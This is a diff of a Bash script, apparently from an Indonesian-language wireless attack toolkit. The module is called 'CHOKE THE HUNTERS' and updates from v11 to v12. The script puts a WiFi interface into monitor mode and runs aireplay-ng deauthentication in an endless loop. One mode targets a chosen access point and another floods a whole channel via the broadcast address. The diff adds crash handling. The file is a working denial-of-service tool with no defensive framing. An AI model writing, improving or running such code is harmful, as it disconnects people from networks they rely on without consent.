@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # ============================================
-#   MODULE: CHOKE THE HUNTERS (v11.0 Smart Device)
+#   MODULE: CHOKE THE HUNTERS (v12.0 Smart Crash)
 # ============================================
 
 if [ -f "./bxp_libcore.sh" ]; then source ./bxp_libcore.sh; fi
@@ -37,21 +37,14 @@ pilih_interface() {
 }
 
 setup_monitor() {
-    echo -e "\033[0;33m[*] Menyiapkan Monitor Mode...\033[0m"
-    systemctl stop NetworkManager 2>/dev/null; nmcli radio wifi off 2>/dev/null; airmon-ng check kill >/dev/null 2>&1
-    airmon-ng start "$IFACE" >/dev/null 2>&1
-    
-    # Cari interface monitor yang BARU dibuat oleh airmon-ng
+    systemctl stop NetworkManager 2>/dev/null; nmcli radio wifi off 2>/dev/null; airmon-ng check kill >/dev/null 2>&1; airmon-ng start "$IFACE" >/dev/null 2>&1
     MON_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E "mon" | head -n 1)
     if [ -z "$MON_IFACE" ]; then 
-        # Kalau nggak nemu yang ada "mon"-nya, cek apakah IFACE asli udah berubah jadi monitor
         local TYPE=$(iw dev "$IFACE" info 2>/dev/null | grep type | awk '{print $2}')
         if [ "$TYPE" = "monitor" ]; then MON_IFACE="$IFACE"; else
-            echo -e "\033[0;31m[!] GAGAL: Driver WiFi lo gagal masuk Monitor Mode.\033[0m"
-            return 1
+            echo -e "\033[0;31m[!] GAGAL: Driver WiFi lo gagal masuk Monitor Mode.\033[0m"; return 1
         fi
     fi
-    
     echo -e "\033[0;32m[+] Monitor Mode Aktif di: $MON_IFACE\033[0m"
     return 0
 }
@@ -64,26 +57,6 @@ cleanup() {
     systemctl restart NetworkManager 2>/dev/null; nmcli radio wifi on 2>/dev/null; svc wifi enable 2>/dev/null
 }
 trap cleanup SIGINT SIGTERM
-
-# Fungsi Looping Deauth yang Pinter
-loop_deauth() {
-    local target_bssid="$1"
-    local monitor_iface="$2"
-    
-    while true; do 
-        # Simpen output error
-        OUTPUT=$(aireplay-ng --deauth 10 -a "$target_bssid" "$monitor_iface" 2>&1)
-        
-        # Kalau error "No such device" atau "Invalid", STOP looping!
-        if echo "$OUTPUT" | grep -qE "No such device|Invalid"; then
-            echo -e "\n\033[0;31m[!] CRITICAL ERROR: Hardware/Driver menolak!\033[0m"
-            echo -e "\033[0;33m    Log: $(echo "$OUTPUT" | grep -E "No such device|Invalid" | head -n 1)\033[0m"
-            kill -9 $$ # Bunuh script ini biar nggak nge-loop error
-        fi
-        
-        sleep 0.5
-    done
-}
 
 while true; do
     show_ascii; detect_env
@@ -123,11 +96,26 @@ while true; do
             echo -e "\n${R}[*] INFINITE DEAUTH KE $BSSID...${N}"
             echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
             
-            # Jalanin fungsi pinter di background
-            loop_deauth "$BSSID" "$MON_IFACE" &
+            # Simpen PID function loop ke variabel
+            ( while true; do 
+                aireplay-ng --deauth 10 -a "$BSSID" "$MON_IFACE" > /dev/null 2>&1
+                # Kalau exit code nya bukan 0 (artinya dibunuh OS), break!
+                if [ $? -ne 0 ]; then echo "CRASH" > /tmp/nw_crash.txt; break; fi
+                sleep 0.1
+            done ) &
             LOOP_PID=$!
             
-            read -r
+            # Nunggu user pencet enter ATAU nunggu file crash dibuat
+            while kill -0 $LOOP_PID 2>/dev/null; do
+                if [ -f "/tmp/nw_crash.txt" ]; then
+                    echo -e "\n\033[0;31m[!] HARDWARE CRASH DETECTED: Driver kartu WiFi lo nolak nembak Deauth.\033[0m"
+                    echo -e "\033[0;33m    Solusi: Gunakan USB WiFi Adapter (RTL8812AU/Atheros).\033[0m"
+                    rm -f /tmp/nw_crash.txt
+                    break
+                fi
+                read -t 1 -n 1 -s && break # Cek input tanpa nge-block
+            done
+            
             kill -9 $LOOP_PID 2>/dev/null; pkill -9 -f "aireplay-ng" 2>/dev/null
             cleanup; read -p "Press Enter to continue..."
             ;;
@@ -141,10 +129,24 @@ while true; do
             echo -e "\n${R}[*] ULTIMATE MASS DEAUTH DI CHANNEL $CHAN...${N}"
             echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
             
-            loop_deauth "FF:FF:FF:FF:FF:FF" "$MON_IFACE" &
+            # Simpen PID function loop ke variabel
+            ( while true; do 
+                aireplay-ng --deauth 10 -a "FF:FF:FF:FF:FF:FF" "$MON_IFACE" > /dev/null 2>&1
+                if [ $? -ne 0 ]; then echo "CRASH" > /tmp/nw_crash.txt; break; fi
+                sleep 0.1
+            done ) &
             LOOP_PID=$!
             
-            read -r
+            while kill -0 $LOOP_PID 2>/dev/null; do
+                if [ -f "/tmp/nw_crash.txt" ]; then
+                    echo -e "\n\033[0;31m[!] HARDWARE CRASH DETECTED: Driver kartu WiFi lo nolak nembak Deauth.\033[0m"
+                    echo -e "\033[0;33m    Solusi: Gunakan USB WiFi Adapter (RTL8812AU/Atheros).\033[0m"
+                    rm -f /tmp/nw_crash.txt
+                    break
+                fi
+                read -t 1 -n 1 -s && break
+            done
+            
             kill -9 $LOOP_PID 2>/dev/null; pkill -9 -f "aireplay-ng" 2>/dev/null
             cleanup; read -p "Press Enter to continue..."
             ;;
